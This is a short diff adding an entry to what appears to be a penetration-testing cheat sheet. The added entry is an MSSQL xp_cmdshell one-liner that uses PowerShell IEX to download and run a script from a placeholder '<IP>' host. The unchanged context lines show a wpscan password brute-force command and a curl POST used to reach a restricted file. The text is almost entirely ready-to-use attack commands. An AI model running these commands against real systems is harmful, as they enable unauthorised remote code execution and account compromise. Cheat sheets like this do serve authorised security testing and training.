@@ -419,3 +419,9 @@ curl -H "Content-Length:0" -X POST https://<domain>/restricted_file
 ```
 wpscan -U <username> -P wordlist.txt --url http://url/wordpress
 ```
+
+### Using xp_cmdshell to run a powershell script on MSSQL (thanks to @sinfulz for recommending this)
+
+```
+xp_cmdshell powershell IEX(New-Object Net.WebClient).downloadstring("http://<IP>/powershellscript.ps1")
+```
